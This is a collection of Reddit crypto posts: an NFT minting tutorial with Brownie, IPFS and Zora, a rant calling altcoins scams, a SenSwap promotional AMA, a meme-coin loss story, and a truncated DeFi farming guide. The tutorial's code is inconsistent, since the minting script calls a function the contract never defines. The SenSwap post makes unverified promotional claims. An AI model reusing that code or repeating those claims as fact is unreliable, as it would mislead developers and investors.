ethereum and smart contracts if these words mean nothing to you, don’t worry! in short, ethereum is a blockchain that supports the execution of smart contracts; these are programs that reside at a unique address on the ethereum blockchain. these contracts are actually types of ethereum accounts and they can receive and send funds just like any other account, however, they are controlled by the program logic that was specified at the time of them being deployed to the blockchain. note that the native token to the ethereum blockchain is called ether (denoted eth) and having this ether will be required to facilitate transactions. for more, check out the following: [intro to ethereum | ethereum.org](https://ethereum.org/en/developers/docs/intro-to-ethereum/) [introduction to smart contracts | ethereum.org](https://ethereum.org/en/developers/docs/smart-contracts/) ## erc-721: the non-fungible token standard an nft, defined by the erc-721 standard is a unique token that resides on the blockchain and is associated with a specific smart contract that complies with the standard. each nft, belonging to a smart contract has a unique token id within that contract such that it can be differentiated from other tokens in the collection. each nft can be associated with some further data beyond its contract address and token id. for our purposes, this data will be a reference to some digital artwork (we’ll come back to this later), however, it could be many other pieces of data too. check out these resources if you would like to learn more: [erc-721 non-fungible token standard | ethereum.org](https://ethereum.org/en/developers/docs/standards/tokens/erc-721/) ## creating our first crypto wallet with metamask in order to participate in the world of crypto and interact with these blockchains, we need some sort of interface. one such interface that many choose to use is a crypto wallet such as metamask. to get started follow the instructions here: [how to create a metamask wallet](https://myterablock.medium.com/how-to-create-or-import-a-metamask-wallet-a551fc2f5a6b) be sure to carefully follow their instructions on keeping track of your seed phrase. this is very important as losing access may lock you out of your wallet or allow someone else to control your funds. ## getting started with some test currency working with real eth can be really expensive and when we’re learning, experimentation on the ethereum main network can add up quickly. even on layer-2 networks like polygon that attempt to curb the expensive transaction fees of ethereum, we need to spend real tokens each time we want to change the state of the blockchain. luckily, ethereum has some test networks that only require test tokens. first, let's make sure that our metamask lets us interact with these test networks. in metamask, click your account icon, then click settings → advanced → toggle “show test networks” to on. great! we can now see the test networks on our metamask. **we’re going to continue with the rinkeby test network from this point on.** now let’s get some test currency in our account. navigate to [https://faucets.chain.link/rinkeby](https://faucets.chain.link/rinkeby). you might have to connect your metamask to the site; just follow the steps provided there. then make sure the network is set to **ethereum rinkeby**, select 10 test link, 0.1 test eth, and confirm that you are not in fact a robot. finally, send the request and you should soon see the funds in your account. we can now spend this test currency to change the state of the blockchain! # setting up our project with the python brownie sdk and infura to get started with blockchain development, we will use brownie, a great framework for doing so. brownie will help us get up and running with our nft projects with agility by using python scripts to deploy and interact with our smart contracts. alongside brownie, we will use infura, an infrastructure-as-a-service product that allows us to easily interact with blockchains. ## installing brownie go ahead and follow the instructions listed here: [eth-brownie](https://pypi.org/project/eth-brownie/) note that the creators of brownie recommend using pipx, however, pip can also be used. ## creating a brownie project now that we have brownie installed, let’s get started with our first project. first, open up the command line and navigate to a location from where you would like to create a new project directory. from here create the project directory. we’ll call ours “nft-demo”. mkdir nft-demo cd nft-demo now we can initialize our new project with the following command: brownie init now, in our nft-demo directory we should see the following subdirectories: &#x200b; * contracts/: contract sources * interfaces/: interface sources * scripts/: scripts for deployment and interaction * tests/: scripts for testing the project * build/: project data such as compiler artifacts and unit test results * reports/: json report files for use in the brownie gui ## configuring the project in addition to the above subdirectories, we’ll also need two additional files in the nft-demo project-level directory: an environment variables file to hide our sensitive variables and a brownie-config file to tell brownie where it can find these variables as well as configure any dependencies. ## .env beginning with the environment variable file, create a new file called .envin the nft-demo directory. to start, include the following code: private_key='' web3_infura_project_id='' pinata_api_key='' pinata_api_secret='' etherscan_token='' for now, we will leave everything blank with the exception of our private\_keyvariable. for this, head to your metamask account → menu → account details → export private key. from here input your metamask password and replace the first line so that it now reads private\_key=<your\_private\_key>. we’ll fill in the rest as we go. for more on environment variables check out the resources below: [an introduction to environment variables and how to use them](https://medium.com/chingu/an-introduction-to-environment-variables-and-how-to-use-them-f602f66d15fa) ## brownie-config.yaml now let’s create our brownie configuration file. in a file called brownie-config.yaml(again, in the nft-demo directory) input the following code: dotenv: .env dependencies: - smartcontractkit/chainlink-brownie-contracts@0.4.0 - openzeppelin/openzeppelin-contracts@4.5.0 compiler: solc: remappings: - '@chainlink=smartcontractkit/chainlink-brownie-contracts@0.4.0' - '@openzeppelin=openzeppelin/openzeppelin-contracts@4.5.0' wallets: from_key: ${private_key} a few important points: &#x200b; * the dotenventry tells brownie where to find our environment variables * at a high level, the dependenciesand compilermappings allow us to easily interact with external libraries (for more info see the resource below) * the walletsentry gives us an easy way to access our private key programmatically so that we can interact with the blockchain as ourselves [the configuration file - brownie 1.18.1 documentation](https://eth-brownie.readthedocs.io/en/stable/config.html) ## connecting to the blockchain with infura before writing a contract that we can deploy to the blockchain, we need a way for us to easily interface with them without having to run our own node. to get started with infura follow the steps provided here: [how to get infura api key](https://medium.com/jelly-market/how-to-get-infura-api-key-e7d552dd396f) once we have our infura project setup, grab the project id and add it to our .envfile so that the second line now reads web3\_infura\_project\_id=<your\_project\_id>. brownie will use this behind the scenes to connect us to blockchain networks so we don’t have to worry about this too much from here on. we’re now ready to begin writing our first nft smart contract! # writing our first smart contract let’s jump right in by creating a new file in the contracts subdirectory called watercollection.sol. this will be the contract for our new nft collection. our project directory structure should now look like this: - nft-demo | - build | - contracts | - watercollection.sol | - interfaces | - reports | - scripts | - tests note that solidity is a popular programming language for smart contract development. for a deeper dive check out their docs: [solidity - solidity 0.8.13 documentation](https://docs.soliditylang.org/en/v0.8.13/) to start let’s add the following lines: // spdx-license-identifier: mit pragma solidity ^0.8.0; import ""@openzeppelin/contracts/token/erc721/extensions/erc721uristorage.sol""; import ""@openzeppelin/contracts/token/erc721/erc721.sol""; here we’re doing a few things. firstly, we define a license. don’t worry too much about this, for now, just know that the mit license essentially means that we’re open-sourcing our contract. secondly, we’re defining our solidity version. again, don’t worry too much, but if you’re curious about these versions, check out the docs above. finally, we’re importing contracts from openzeppelin, which can be thought of as a set of trusted smart contracts. we’ll inherit some properties of these contracts for our own contract. ## inheriting the openzeppelin implementation to leverage existing implementations provided by openzeppelin, we’ll create our contract in such a way that it takes on the functionality of openzeppelin contracts. specifically, we’ll be using their erc721uristorage module which is like their base erc721 module, with the added ability to attach data to the nft with a reference called a token uri. this will allow us to associate our nfts with our artwork. be sure to read more about the module here: [erc 721 - openzeppelin docs](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#erc721uristorage) let’s update our watercollection.solfile: // spdx-license-identifier: mit pragma solidity ^0.8.0; import ""@openzeppelin/contracts/token/erc721/extensions/erc721uristorage.sol""; import ""@openzeppelin/contracts/token/erc721/erc721.sol""; contract watercollection is erc721uristorage { uint256 public tokencounter; } we now have an outline for our new watercollectioncontract that inherits the openzeppelin contract. note that we have also added a contract variable tokencounterthat will allow us to keep track of the number of nfts that have been created by our contract. ## defining a contract constructor a constructor method allows us to define the behavior of our contract upon deployment. let’s update our watercollection.solfile again: // spdx-license-identifier: mit pragma solidity ^0.8.0; import ""@openzeppelin/contracts/token/erc721/extensions/erc721uristorage.sol""; import ""@openzeppelin/contracts/token/erc721/erc721.sol""; contract watercollection is erc721uristorage { uint256 public tokencounter; constructor() public erc721(""water collection"", ""drip"") { tokencounter = 0; } } here, we call the openzeppelin erc721 constructor, defining that its name is “water collection” and its token symbol is “drip”. additionally, we set the token counter of our contract to 0 as at the time of deployment, we will have yet to create an nft. ## a method to create an nft let’s now define a method that allows us to actually create an nft with our contract. we’ll update the contact again: // spdx-license-identifier: mit pragma solidity ^0.8.0; import ""@openzeppelin/contracts/token/erc721/extensions/erc721uristorage.sol""; import ""@openzeppelin/contracts/token/erc721/erc721.sol""; contract watercollection is erc721uristorage { uint256 public tokencounter; constructor() public erc721(""water collection"", ""drip"") { tokencounter = 0; } function createtoken(string memory tokenuri) public returns (bytes32){ require(tokencounter < 100, ""max number of tokens reached""); uint256 tokenid = tokencounter; _safemint(msg.sender, tokenid); _settokenuri(tokenid, tokenuri); tokencounter++; } } we’ve written a method that takes a token uri string as an argument. let’s review the logic. to begin, we’ve chosen to require that a maximum of 100 nfts may be created with this contract. this is a design choice and does not necessarily need to be done, however, in our case, if someone were to attempt creating a 101st nft, they would receive an error message and it would not be created. next, we set the token id to the current tokencounterso that we can call the erc721 \_safemintmethod and the erc721uristorage \_settokenurimethod. the \_safemintmethod creates or “mints” a new token to our contract and sets its owner to whoever called the createtokenmethod with a token id of tokencounter. then, the \_settokenurimethod sets the token uri of that token to the string passed to our function. we’ll discuss what this should be soon. finally, we increment our token counter to update the number of tokens in our collection. our contract is now done and ready to be deployed! let’s run brownie compileto make sure everything is working. we should see a message asserting that our project has been compiled. ## a script to deploy our contract to a testnet now that our contract is complete, we can write ourselves a python script to deploy it to the blockchain of our choosing. go ahead and open a new file in the scriptssubdirectory of our project called deploy\_water.pywith the following code: from brownie import watercollection, accounts, config def main(): dev = accounts.add(config['wallets']['from_key']) watercollection.deploy( {'from': dev} ) here we are storing the information about our account that we obtain via the private key we referenced in our brownie-config.yamlfile to the devvariable. with this account information, we are asking brownie to deploy our contract to the blockchain and signing the transaction with our information with the {'from': dev}snippet so that the blockchain can identify us as the sender of this state change. our project directory should now look like this: - nft-demo | - build | - contracts | - watercollection.sol | - interfaces | - reports | - scripts | - deploy_water.py | - tests let’s run this script with brownie so that it deploys to the ethereum rinkeby test network. from our nft-demo directory run: brownie run scripts/deploy_water.py --network rinkeby we should now see something similar to the following: running 'scripts/watercollection/deploy_water.py::main'... transaction sent: 0xade52b4a0bbabdb02aeda6ef4151184116a4c6429462c28d4ccedf90eae0d36d gas price: 1.033999909 gwei gas limit: 1544657 nonce: 236 watercollection.constructor confirmed block: 10423624 gas used: 1404234 (90.91%) watercollection deployed at: 0xe013b913ca4dad36584d3cbfcab6ae687c5b26c5 to make sure everything went as expected, we can go to [https://rinkeby.etherscan.io/](https://rinkeby.etherscan.io/). this is a service that allows us to explore the blockchain. go ahead and copy the address that your watercollection was deployed at and paste it into the etherscan rinkeby search bar. keep this address ready for later! we should see a single transaction under the contract that represents our contract creation. great! we’re deployed to rinkeby and ready to learn about decentralized storage. # blockchain storage and ipfs as we touched on earlier, we’re going to need a way to associate our artwork with our nfts. since we’re aiming to ensure that the future owners of our tokens have invariant access and ownership of the artwork associated with their token so long as they own said token, we would ideally like to have our nft directly contain the binary data of its artwork. however, we must recognize that storing large amounts of data on the blockchain can be very expensive and a high-resolution image or even set of frames can require a great deal of storage. this motivates us to associate the data indirectly through the token uri that we mentioned earlier. this uri is a link to an external resource wherein our data is stored. ## why decentralized storage? since we’re going to be using an external link, our intuition might be to simply use a link to an address at some cloud storage provider such as google drive or aws s3, however, upon further reflection, we see that this is conceptually problematic. since one of the great things about nfts is that they are decentrally managed thus, we do not have to rely on any single organization to ensure that they continue to exist. so, if we stored our artwork in one of these cloud providers, we would effectively be defeating one of the core purposes of nfts by relying on a central body to persist our artwork. admittedly, it is unlikely that google or aws suddenly cease to exist, however, to preserve the decentralized properties of our nfts we will seek out a decentralized method of storage. ## ipfs luckily, we have the interplanetary file system (ipfs), which is a peer-to-peer distributed file system that we can use to store our data. for more on ipfs, take a look at their website: [ipfs powers the distributed web](https://ipfs.io/) ## pinning data to ipfs with pinata a great way to interact with and persist data to ipfs is through a service called pinata. go ahead and create a free pinata account. the following guide will walk you through getting your api key and secret (both of which we will need), as well as explain a little more about pinning data with pinata: [how to pin to ipfs effortlessly](https://medium.com/pinata/how-to-pin-to-ipfs-effortlessly-ba3437b33885) once you have your api key and secret, let’s go back to our .envfile and fill them in. it should now resemble: private_key=<your_private_key> web3_infura_project_id=<your_project_id> pinata_api_key=<your_pinata_key> pinata_api_secret=<your_pinata_secret> etherscan_token='' ## preparing our artwork for ipfs now that we’re almost ready to upload our artwork to ipfs, we should consider what it is that we want to include. for this tutorial, i’ve chosen to use 100 pictures of water like this one: 📷 you can choose whatever you like for your art! now for simplicity’s sake, i have named my images 1.jpg, 2.jpg, ..., 100.jpg, but if you want to get more creative, awesome; you’ll just have to make sure to map their names to numbers somehow so that our script that we’ll soon write can find each of them. let’s create a new imagessubdirectory and upload our artwork there. the project directory should now look something like this: - nft-demo | - build | - contracts | - watercollection.sol | - images | - 1.jpg | - ... | - 100.jpg | - interfaces | - reports | - scripts | - deploy_water.py | - tests now we have a place for our script (that we’re about to write) to find our artwork. ## a script to save our artwork and metadata to ipfs so we have pinata set up and our artwork is ready. let’s write another script to interact with this data. open up a new file in the scriptssubdirectory called create\_metadata.py. before we start writing our code, we should quickly review what we’re trying to do. due to the specification of the erc721 (nft) standard, our data (that we are referencing through the token uri) is not going to be the artwork itself, but a metadata file in which the actual artwork is referenced. its gonna look something like this: 📷 so, we are going to have to upload 2 files to ipfs for each nft: 1 for the artwork itself, and 1 for the metadata file that references the artwork. now that we’ve covered that, let’s write our script in create\_metadata.py: import requests import os import json metadata_template = { ""name"": """", ""description"": """", ""image"": """" } def main(): write_metadata(100) def write_metadata(num_tokens): # we'll use this array to store the hashes of the metadata meta_data_hashes = [] for token_id in range(num_tokens): collectible_metadata = metadata_template.copy() # the filename where we're going to locally store the metadata meta_data_filename = f""metadata/{token_id + 1}.json"" # name of the collectible set to its token id collectible_metadata[""name""] = str(token_id) # description of the collectible set to be ""wata"" collectible_metadata[""description""] = ""wata"" # path of the artwork to be uploaded to ipfs img_path = f""images/{token_id + 1}.jpg"" with open(img_path, ""rb"") as f: img_binary = f.read() # upload the image to ipfs and get the storage address image = upload_to_ipfs(img_binary) # add the image uri to the metadata image_path = f""<https://ipfs.io/ipfs/{image}>"" collectible_metadata[""image""] = image_path with open(meta_data_filename, ""w"") as f: # write the metadata locally json.dump(collectible_metadata, f) # upload our metadata to ipfs meta_data_hash = upload_to_ipfs(collectible_metadata) meta_data_path = f""<https://ipfs.io/ipfs/{meta_data_hash}>"" # add the metadata uri to the array meta_data_hashes.append(meta_data_path) with open('metadata/data.json', 'w') as f: # finally, we'll write the array of metadata uris to a file json.dump(meta_data_hashes, f) return meta_data_hashes def upload_to_ipfs(data): # get our pinata credentials from our .env file pinata_api_key = os.environ[""pinata_api_key""] pinata_api_secret = os.environ[""pinata_api_secret""] endpoint = ""<https://api.pinata.cloud/pinning/pinfiletoipfs>"" headers = { 'pinata_api_key': pinata_api_key, 'pinata_secret_api_key': pinata_api_secret } body = { 'file': data } # make the pin request to pinata response = requests.post(endpoint, headers=headers, files=body) # return the ipfs hash where the data is stored return response.json()[""ipfshash""] i’ll let you verify the code for yourself, but in short, it will save all of our artwork to ipfs, create a metadata file in the following format: { ""name"": ""<token_id>"", ""description"": ""wata"", ""image"": ""<https://ipfs.io/ipfs/><artwork_ipfs_hash>"" } and will write this file both locally under a metadatasubdirectory (that we will create momentarily) to a file called <token\_id>.json, and to ipfs. finally, it will save a list of the ipfs metadata hashes to a file called data.jsonin that same subdirectory. go ahead and run the following commands in your command line from the nft-demo directory: mkdir metadata brownie run scripts/create_metadata.py --network rinkeby if all goes as expected, we will now have the following project structure: - nft-demo | - build | - contracts | - watercollection.sol | - images | - 1.jpg | - ... | - 100.jpg | - interfaces | - metadata | - data.json | - 1.json | - ... | - 100.json | - reports | - scripts | - deploy_water.py | - create_metadata.py | - tests now we’re ready to mint our collection! # minting our collection so our contract is deployed to the rinkeby network and we have all of our artwork and metadata written to ipfs. now it's time to mint our collection. ## a script to mint our collection by calling our contract let’s write one more script in our scriptssubdirectory to mint our collection called create\_collection.py: import json from pathlib import path from brownie import ( accounts, config, watercollection, ) from scripts.watercollection.create_metadata import write_metadata def main(): # get our account info dev = accounts.add(config['wallets']['from_key']) # get the most recent deployment of our contract water_collection = watercollection[-1] # check the number of currently minted tokens existing_tokens = water_collection.tokencounter() print(existing_tokens) # check if we'eve already got our metadata hashes ready if path(f""metadata/data.json"").exists(): print(""metadata already exists. skipping..."") meta_data_hashes = json.load(open(f""metadata/data.json"")) else: meta_data_hashes = write_metadata(100) for token_id in range(existing_tokens, 100): # get the metadata hash for this token's uri meta_data_hash = meta_data_hashes[token_id] # call our createcollectible function to mint a token transaction = water_collection.createcollectible( meta_data_hash, {'from': dev, ""gas_limit"": 2074044, ""allow_revert"": true}) # wait for 3 blocks to be created atop our transactions transaction.wait(3) again, please verify the code yourself, but this script essentially makes sure we have access to the ipfs addresses of our metadata and then creates our collection one by one using these addresses as our token uris. now we can run the script with: brownie run scripts/create_collection.py --network rinkeby let’s head over to [https://testnets.opensea.io/](https://testnets.opensea.io/) and put our contract address in the search bar. it may take several minutes to load, but if we check back we should see our collection here! we’ve now minted our collection! all that remains is to list our tokens. # redeploying on other networks now that we’ve done this on the rinkeby test network, you might be wondering how we can redo this on a real network so that we can profit off of our hard work and artistry. luckily, it’s as simple as changing the network argument that we provide to brownie. say we’d like to deploy to the polygon network we just have to rerun our scripts on the polygon network (we can use the same ipfs addresses): brownie run scripts/deploy_water.py --network polygon-main brownie run scripts/create_collection.py --network polygon-main just note that we’re going to need some matic (polygon’s native token) to interact with the polygon network. if we do this, we’ll be able to see our collection at [https://opensea.io/](https://opensea.io/) under the address of our contract on the polygon network (we’ll get this when we run that first deploy script on the polygon network). # listing our nfts finally, let’s list our nfts in a marketplace. for this, we’ll be using zora, an nft marketplace protocol, but feel free to explore other options on your own. ## zora asks module the zora asks module allows us to list our nfts by providing the address of our nft contract, the token id of the token to be listed, an ask currency, an ask price (in our ask currency), an address to deposit the funds from a sold nft, and a finders fee to incentivize referrals to our nfts. you can check out their docs here: [asks v1.1 | zora docs](https://docs.zora.co/docs/smart-contracts/modules/asks/zora-v3-asks-v1.1) ## etherscan api before we write our script to list these asks, we need a way to programmatically access the zora contracts. to do so we’re going to use etherscan’s api. go ahead and get yourself a free api by creating an etherscan account and following their instructions here: grab your api token and fill in the final line of your .envfile so that it reads etherscan\_token=<your\_etherscan\_api\_token>. now brownie will be able to pull contracts from ethereum networks behind the scenes. note that you can apply a very similar process for the polygon network by getting a polyscan api token here: [polygonscan apis](https://polygonscan.com/apis) and adding a new .enventry: polygonscan\_token=<your\_polyscan\_api\_token>. ## a script to list our nft collection now for our final script. again in the scriptssubdirectory, let’s create a new file called set\_asks.py: from brownie import watercollection, network, accounts, config, contract def main(): # fill your own metamask public key here creator_address = """" net = network.show_active() water_collection = watercollection[-1] # get the asks contract depening on the network if net == ""polygon-main"": asks_address = ""0x3634e984ba0373cfa178986fd19f03ba4dd8e469"" asksv1 = contract.from_explorer(asks_address) module_manager = contract.from_explorer(""0xcca379fdf4beda63c4bb0e2a3179ae62c8716794"") erc721_helper_address = ""0xce6cef2a9028e1c3b21647ae3b4251038109f42a"" water_address = ""0x0d2964fb0bee1769c1d425aa50a178d29e7815a0"" weth_address = ""0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"" elif net == ""rinkeby"": asks_address = ""0xa98d3729265c88c5b3f861a0c501622750ff4806"" asksv1 = contract.from_explorer(asks_address) module_manager = contract.from_explorer(""0xa248736d3b73a231d95a5f99965857ebbbd42d85"") erc721_helper_address = ""0x029aa5a949c9c90916729d50537062cb73b5ac92"" water_address = ""0xfa3d765e90b3fbe91a3aafff1a611654b911eadb"" weth_address = ""0xc778417e063141139fce010982780140aa0cd5ab"" dev = accounts.add(config['wallets']['from_key']) # give zora permission to facilitate transactions with the ask contract module_manager.setapprovalformodule(asks_address, true, {""from"": dev}) water_collection.setapprovalforall(erc721_helper_address, true, {""from"": dev}) for token_id in range(100): price = (100 - token_id) * 10 ** 16 asksv1.createask(water_address, # address of our contract token_id, # token id of the nft to be listed price, # our asking price weth_address, # the address of the token required to pay for our nft creator_address, # the address where the funds will be sent to 0, # a finder reward {'from': dev}) # sign our transaction with our account this script is going to access the zora asks contract and list our nfts using a sliding price scale. here, we’re asking that the nfts be paid for in wrapped eth, however, you can change this if you’d like. also, note that this script is going to approve the zora contract to move funds and nfts on our behalf. it’s always good practice to verify the contract logic before approving it, but you can take my word for its legitimacy if you’d like. finally, we’ll run our script: brownie run scripts/set_asks.py --network rinkeby awesome! we’ve now listed our collection on rinkeby testnet and can start selling! this tutorial covers listing your collection and accepting 1 token (weth) from 1 chain (rinkeby/mainnet). if you'd like a super simple way to accept any token from any chain, check us out at [brydge](https://brydge.network)! happy to help answer questions!",427,579,0.98,2022-04-07 14:12:51,web3,NFT,the_altoid_road,False,497.6

The way you see Cryptocurrency after multiple bear markets is a lens of everything being a scam,"i got out before celsius crashed. i also lost almost my entire life savings to luna. i am still here. i bought bitcoin at $15k five years ago and held. i am finally in the green and up thousands. it makes me feel nothing. i’m pretty sure at this point, a lot of alts are just gonna go into nothing this cycle. all i’ve learned from crypto is bitcoin is king and every other crypto are basically scams or a joke that don't have capped supplies. bitcoin is limited. all these other crypto’s are minted constantly equivalent to the us dollar at this point. why do we as a community stand for that and allow it? basically from what i'm understanding we as a community are okay with being scammed because of ""freedom"" in crypto, the whole industry is strange to me. i’m all for avax and other crypto that have limited supplies, but i’m done with unlimited minting cryptocurrencies. i get that i have more understanding now of crypto through the projects that i got screwed by, researched the project i am backing and pulled out of the ones which have minting rates of the millions each year. please explain to me how something like doge is being considered for the new peoples currency when it is the exact same thing as the us dollar, printed whenever wanted- just on the blockchain. it’s minted whenever they want constantly. just because it has blockchain technology, that is a buzzword, and it has elons backing, that's why takes off. it’s more secure to our community but store of value has nothing or no difference to the dollar. i think you are a cryptocurreny og if you start seeing this entire industry as 90% rug pulls, scams, ways to lose your money entirely and then rest is waiting a decade to even get a slight return because of how bad it is.",606,282,0.86,2024-11-18 11:55:36,web3,CryptoCurrency,FunnyGamer97,False,485.0

We are SenSwap - an open liquidity protocol built on Solana that promotes Zero Impermanent Loss and Liquidity Efficiency - Here to answer your questions.,"# greetings from senswap’s founder! hi everyone, my name is tu phan. **i'm senswap's founder, and i'm here to answer all of the questions you have for us!** with 5-years experience in blockchain and won the second prize in solana's inaugural hackathon in 2020, i built sen as an open platform to connect developers and end-users. my vision is to create a decentralized hub where developers can inherit available liquidity to develop their applications while users gain access to well-developed innovative apps that generate a high yield of profits. zero impermanent loss and liquidity efficiency are my two main goals while building this amm. those are my sharing points. what are your thoughts? feel free to drop me any questions in the comment section below. # about senswap senswap is an open liquidity protocol built on solana that promotes zero impermanent loss and liquidity efficiency. solana is our choice to lay the foundation for the next generation of defi by ultimately ensuring high security, decentralization but greatly improved scalability, up to 65,000 tps (transactions per second), and 400ms block times without applying complex solutions. transaction fees on the solana platform are among the cheapest, only around $ 0.00001. this overcomes the obstacles of transaction fees and the increase in time per transaction, problems where eth has yet to find an optimal solution. besides that, senswap tackles the challenge of open platform and open liquidity: **open platform.** people can introduce their ideas to others natively on the platform. • sen offers developers a complete solution for dapp development. • developers can deliver dapps via the sen store. • users can organize favorite dapps for an optimal workflow on a single page. **open liquidity.** being open in terms of use and development. • an amm with dual and triad pools will become a liquidity accumulator. • sen becomes a universal interface for the entire ecosystem (i.e., price evaluation, liquidity automation) • dao allows people to control liquidity appropriately. &#x200b; https://preview.redd.it/xlj4yo7k58o71.jpg?width=1200&format=pjpg&auto=webp&s=5920e5ea7cbfc6f9d2d17124412df5287048755d # recent news & achievements 1. senswap devnet: our devnet attracts more than 1300 users and over 160 pools created. we receive positive feedback and suggestions for improvement, you can try our devnet at [https://app.senswap.com/](https://app.senswap.com/) https://preview.redd.it/tlhnzmfl58o71.jpg?width=1280&format=pjpg&auto=webp&s=3045a0ae2fe5a36e4beaa85d016294c5ec22d3d1 2. senswap x parrot: senswap will be collaborating with party parrot to open a platform of mini-dapps, to create games and use cases for $pai and $psol. a pai-psol-sen triple swap pool willbe set up to support the liquidity needs of these mini-dapps. 3. new interface: we launched our new interface to make it easier for users to use. # looking ahead. 1. we will announce our investors and partners soon, and they will not make you disappointed! 2. sen will launch within 2021; look out for this! 3. sen challenge with attractive rewards will roll out next week; follow our channels not to miss this great opportunity! https://preview.redd.it/0x7oxlbea8o71.jpg?width=4800&format=pjpg&auto=webp&s=505bc006f6926854ec84e2d230bd1027ded72e81 ## senswap community website:[ senswap.com](http://senswap.com/) medium:[ senswap.medium.com](http://senswap.medium.com/) telegram:[ t.me/senswap](http://t.me/senswap) telegram announcements:[ t.me/senswapann](http://t.me/senswapann) discord:[ discord.gg/vd7ubap2hn](http://discord.gg/vd7ubap2hn) twitter:[ twitter.com/senswap](http://twitter.com/senswap)",612,221,1.0,2021-09-18 04:45:52,web3,solana,Jennie_SenSwap,False,465.6

Everyone who has lost money on SOL meme coins,"hey there, i don't know you. i'm sharing something personal because i think it's important. in the past month, i've experienced significant financial losses—around $30,000. i'm not sure where you stand, but perhaps you've also faced losses, whether big or small. it's tough. let me tell you, i've been through the wringer. i lost 90% of my investment in a single day due to a rug pull. the aftermath was relentless. days spent trying to claw my way back, eyes glued to screens, chasing every lead on telegram, twitter—anywhere. it's exhausting, soul-crushing even. but here's what i've come to realize: the game is rigged. those making gains often have an unfair advantage. there are insiders, snipers, who swoop in and scoop up opportunities before the rest of us even blink. yet, despite the devastation, it's not the end. i wiped out my entire savings, transitioning from a comfortable life to living paycheck to paycheck. rebuilding won't be easy; it might mean taking on multiple jobs. but it's not over. there's a lesson in this pain, albeit a costly one. i just hope it prevents others from making the same mistakes or facing even harsher consequences down the line. i don't know your situation, but i want you to know you're not alone. money comes and goes, but people—those who care about you—they're what truly matter. it's infuriating that there are individuals out there preying on others' vulnerability, exploiting trust for personal gain. it's a bitter pill to swallow. but please, take a moment. put the phone down, shut down the computer. step outside. remember, life is more than just crypto and money. focus on moving forward, on the things that truly matter. i promise, you'll be okay. if this helps even one person, this post was worth it. update: wow, first of all. some of you need to realize that if you have nothing nice to say, keep it to yourself. so, here's how it all went down: my initiation into the world of meme coins. i threw some cash—maybe $200 or even less—into one of these internet sensations, fully prepared to see it disappear. but then, against all odds, it took off. i couldn't resist pouring in more money as the value soared. before i knew it, i was investing sums i never imagined, caught up in the frenzy. then came the inevitable crash. naively, i doubled down, hoping to catch the rebound and salvage my initial investment. but it kept plummeting. with over 2,000 members in the telegram group, it was a slow-motion disaster. liquidity locked, yet i didn't grasp the intricacies. dollar-cost averaging bots were selling, compounding the chaos. by the time i understood the extent of it, i, like thousands of others, had lost a significant amount. even the callers were in shock and said they trusted the dev. one of them said they lost close to 100k. (idk if it's true, but everyone i spoke to lost money in this) it was a meticulously crafted meme coin, backed by a network of connections. there were numerous articles on reputable websites, including coinmarketcap. it transcended the typical low-quality website and telegram presence, capturing the attention of a vast audience. search ""meme coins,"" ""dogwifhat,"" ""pepe,"" or ""bonk,"" and this coin would inevitably appear. whoever masterminded this was both brilliant and deceitful. its value skyrocketed to $30 million, only to come crashing down to around $500,000. a bitter pill to swallow. let me be clear: i'm not seeking advice or sympathy. i'm simply highlighting the stark reality of this situation—it's pure gambling. if you've fallen prey to it, there's hope, but don't let it consume you. tl;dr: meme coin gambling wiped out most of my savings. learn from my mistake, please seek help and don’t do anything drastic. (again not asking for advice or sympathy) trying to help others not make the same mistakes. https://preview.redd.it/bfw4gi5lmfyc1.png?width=716&format=png&auto=webp&s=08df19d1574d37d464f196aae6c88cff93b92978",358,511,0.88,2024-05-03 21:14:27,web3,solana,[deleted],False,428.0

DeFi Guide for Newbie (and How to Manage Risk),"# start with the coin you already have i started with binance smart chain back in march simply because i have bnb ready. i won't explain how to transfer to your wallet, tons of other guides for that. go to [defillama](https://defillama.com/chains) and check which defi is available in your chain. as a beginner, you should try the #1 decentralized exchange (dex) in that chain. they are: * **bsc** \- pancakeswap * **ftm** \- spookyswap * **avax** \- trader joe * **matic** \- quickswap * **one** \- defi kingdom * **sol** \- raydium * **luna** \- terraswap (astroport has low traffic despite having more tvl) * **cro** \- vvs * **near / aurora** \- trisolaris * **eth** \- fuck the gas, farm eth in matic or other chain instead &#x200b; [the defi list of avax. the first is aave, but that's a lending platform. so traderjoe is #1 dex.](https://preview.redd.it/1i45tss3h3a81.png?width=1461&format=png&auto=webp&s=4afd4dcb0cb0b1c77c2fdb8add1f4c1f0b91c854) if you go to their website and check out the farm, you will see something like avax-usdc 30% apr these are called **liquidity pool** and it is the primary thing to farm in defi. ## ## what's liquidity pool? basically, you need to provide an **equal amount of two tokens** to start farming it. if avax is $100 and you want to farm 10 avax in avax-usdc pool, you need to add $1000 usdc. this means you have $2000 worth of token farming with a 30% apr (interest rate per year). this rate keeps changing though, we will discuss it further later. alternatively, if you don't have more capital to add in the other token, simply **swap** 5 avax into usdc. ## ## what's swapping? you swap token a to token b. i'm pretty sure most of you have used it to buy shit like daddyelonrocketinu. these swaps are facilitated by other people who are providing lp. each swap has a trading fee, usually 0.3%. that fee is split between the admin and lp providers. **this shared fee is where the apr comes from**. this is why the apr keeps changing. and when the market is pumping or dumping, the apr becomes high because a lot of people are trading in and out. in addition to that fee, most dexes give their **farm token** as a bonus if you stake the lp. &#x200b; [swapping ftm to usdc in spookyswap](https://preview.redd.it/mspb5vftg3a81.png?width=504&format=png&auto=webp&s=b2aff49dc54bf7f50f4e1568c6928b3cc770bddc) # # what's farm token? when you create an lp, you immediately start accruing the trading fee. it's compounded directly to your lp. but most dexes allow you to **stake the lp** to get its farm token. for example cake in pancakeswap or boo in spookyswap. these farm tokens are **highly inflationary** and prices tend to go down. always research its tokenomic and use case. if there are an infinite amount and the only use case is to be staked (or for voting power), it's not looking good. there are of course some **exceptions** like curve and convex. some organizations are buying the farm token because they want bigger voting power. &#x200b; ## is the apr from trading fee or farm token? both. the apr shown is a combination of the trading fee and farm token. for example, the eth-usdc pool in sushiswap gives 35% apr. but only 4.3% in farm token, the rest is the trading fee. this means you rely almost entirely on the trading activity, which can fluctuate heavily. same goes for bnb-busd in pancakeswap. only 6.6% is in farm token. currently it's sitting at 22% apr. but i have seen some days when it's sitting at like 10%. &#x200b; [bnb-busd reward details in pancakeswap](https://preview.redd.it/2thkkrnkg3a81.png?width=399&format=png&auto=webp&s=f0ef71135770b3028e7da3b7ab2e8d9f89cd6c18) if you don't want to keep the farm token, you can swap them to the token you're farming and compound them. obviously that takes a lot of effort and gas fee. this is why there is someone creating **auto-compounder like 